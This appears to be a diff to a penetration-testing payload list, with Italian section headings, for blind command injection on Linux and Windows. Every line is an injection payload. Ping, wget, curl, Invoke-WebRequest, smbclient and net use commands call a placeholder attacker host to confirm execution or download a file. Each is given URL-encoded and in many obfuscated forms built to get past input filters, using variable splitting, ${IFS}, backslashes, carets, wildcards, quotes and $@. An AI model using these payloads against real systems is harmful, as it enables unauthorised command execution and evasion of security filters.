@@ -1,4 +1,5 @@
 ==> Comandi Linux / windows:
+== in chiaro
 ping -c 1 <ATTACKER-IP>
 ping -n 1 <ATTACKER-IP>
 ping+-c+1+<ATTACKER-IP>
@@ -6,9 +7,47 @@ ping+-n+1+<ATTACKER-IP>
 wget http://<ATTACKER-IP>/HereWeAre
 wget+http://<ATTACKER-IP>/HereWeAre
 Invoke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
-curl -o hello.html http://<ATTACKER_IP>/HereWeAre
 Invoke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+curl -o hello.html http://<ATTACKER_IP>/HereWeAre
 curl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+smbclient //<ATTACKER-IP>/share -N
+smbclient+//<ATTACKER-IP>/share+-N
+net use \\<ATTACKER-IP>\share
+net+use+\\<ATTACKER-IP>\share
+
+
+== offuscamento con variabili (solo per linux)
+a=pi;b=ng;$a$b -c 1 <ATTACKER-IP>
+a=pi;b=ng;$a$b+-c+1+<ATTACKER-IP>
+a=w;b=get;$a$b http://<ATTACKER-IP>/HereWeAre
+a=w;b=get;$a$b+http://<ATTACKER-IP>/HereWeAre
+wget+http://<ATTACKER-IP>/HereWeAre
+a=smb;b=client;$a$b //<ATTACKER-IP>/share -N
+a=smb;b=client;$a$b+//<ATTACKER-IP>/share -N
+
+
+== offuscamento IFS (solo per linux). IFS al posto dello spazio o del +
+ping${IFS}-c${IFS}1${IFS}<ATTACKER-IP>
+wget${IFS}http://<ATTACKER-IP>/HereWeAre
+smbclient${IFS}//<ATTACKER-IP>/share -N
+
+
+== offuscamento \ (solo per linux)
+pi\ng -c 1 <ATTACKER-IP>
+pi\ng+-c+1+<ATTACKER-IP>
+wg\et http://<ATTACKER-IP>/HereWeAre
+wg\et+http://<ATTACKER-IP>/HereWeAre
+sm\bclient //<ATTACKER-IP>/share -N
+sm\bclient+//<ATTACKER-IP>/share+-N
+
+
+== offuscamento ^ (solo per windows)
+pi^ng -n 1 <ATTACKER-IP>
+pi^ng+-n+1+<ATTACKER-IP>
+Inv^oke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
+Inv^oke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
+ne^t use \\<ATTACKER-IP>\share
+ne^t+use+\\<ATTACKER-IP>\share
 
 
 == offuscamento ?
@@ -18,8 +57,14 @@ p?ng+-c+1+<ATTACKER-IP>
 p?ng+-n+1+<ATTACKER-IP>
 /usr/bin/wg?t http://<ATTACKER-IP>/HereWeAre
 /usr/bin/wg?t+http://<ATTACKER-IP>/HereWeAre
-Invo?ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
-cur?l -o hello.html http://<ATTACKER_IP>/HereWeAre
+Invo?ke-WebRequest -Uri "http://<ATTACKER-IP>/HereWeAre" -OutFile "HereWeAre"
+Invo?ke-WebRequest+-Uri+"http://<ATTACKER-IP>/HereWeAre"+-OutFile "HereWeAre"
+cur?l -o hello.html http://<ATTACKER-IP>/HereWeAre
+cur?l+-o+hello.html+http://<ATTACKER-IP>/HereWeAre
+smb?client //<ATTACKER-IP>/share -N
+smb?client+//<ATTACKER-IP>/share+-N
+net u?se \\<ATTACKER-IP>\share
+net+u?se+\\<ATTACKER-IP>\share
 
 
 == offuscamento *
@@ -31,7 +76,10 @@ p*ing -n 1 <ATTACKER-IP>
 /usr/bin/wg*t+http://<ATTACKER-IP>/HereWeAre
 Invo*ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 cur*l+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
-
+smbc*lient //<ATTACKER-IP>/share -N
+smbc*lient+//<ATTACKER-IP>/share+-N
+net u*se \\<ATTACKER-IP>\share
+net+u*se+\\<ATTACKER-IP>\share
 
 == offuscamento '
 p''i'n'g+-c+1+<ATTACKER-IP>
@@ -42,7 +90,10 @@ In''voke-Web''Request -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
 cu''rl -o hello.html http://<ATTACKER_IP>/HereWeAre
 In''voke-Web''Request+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 cu''rl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
-
+sm''bclient //<ATTACKER-IP>/share -N
+sm''bclient+//<ATTACKER-IP>/share+-N
+ne''t use \\<ATTACKER-IP>\share
+ne''t+use+\\<ATTACKER-IP>\share
 
 == offuscamento \
 p\i\ng+-c+1+<ATTACKER-IP>
@@ -53,7 +104,10 @@ Invo\ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
 cu\rl -o hello.html http://<ATTACKER_IP>/HereWeAre
 Invo\ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 cu\rl+-o+hello.html http://<ATTACKER_IP>/HereWeAre
-
+sm\bclient //<ATTACKER-IP>/share -N
+sm\bclient+//<ATTACKER-IP>/share+-N
+ne\t use \\<ATTACKER-IP>\share
+ne\t+use+\\<ATTACKER-IP>\share
 
 == offuscamento $@
 Pin$@g+-c+1+<ATTACKER-IP>
@@ -64,3 +118,7 @@ Invo$@ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
 cu$@rl -o hello.html http://<ATTACKER_IP>/HereWeAre
 Invo$@ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 cu$@rl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
+sm$@bclient //<ATTACKER-IP>/share -N
+smb$@client+//<ATTACKER-IP>/share+-N
+ne$@t use \\<ATTACKER-IP>\share
+ne$@t+use+\\<ATTACKER-IP>\share
